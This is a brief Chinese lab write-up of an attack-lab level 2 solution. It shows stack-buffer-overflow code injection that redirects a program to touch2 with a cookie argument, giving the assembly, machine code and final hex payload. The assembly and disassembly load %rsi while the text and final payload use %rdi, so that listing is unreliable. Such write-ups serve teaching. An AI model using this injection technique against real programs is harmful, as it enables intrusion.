### 思路

- **level2简要说明**
```cpp
较level1多了个要求，即返回到touch2()，并且以cookie为参数传递，
也就是需要我们自己注入代码了.
```

- **解题过程**
```cpp
注入方法：先用GDB调试找到进入getbuf，确定分配内存给字符串后的栈顶，
在此处注入可执行的代码(在第一遍getbuf时认为是读入了字符串)，然后返
回到getbuf初始时的栈顶位置，及将字符串加载到缓冲区后再一次进入缓冲区
的栈顶，但这一次字符串被当成了可执行代码，这样就实现了代码注入.
```

我们注入的代码要实现以下功能：
1，修改%rdi，即返回到touch2时的参数为cookie值
2，成功返回到touch2
得到以下代码

```py
movq    $0x59b997fa,%rsi
pushq   $0x4017ec
ret     # ret指令等价于pop %rip
```

反汇编后得到机器码

```py
0000000000000000 <.text>:
   0:	48 c7 c6 fa 97 b9 59 	mov    $0x59b997fa,%rsi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

- **最终答案**
  
```txt
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```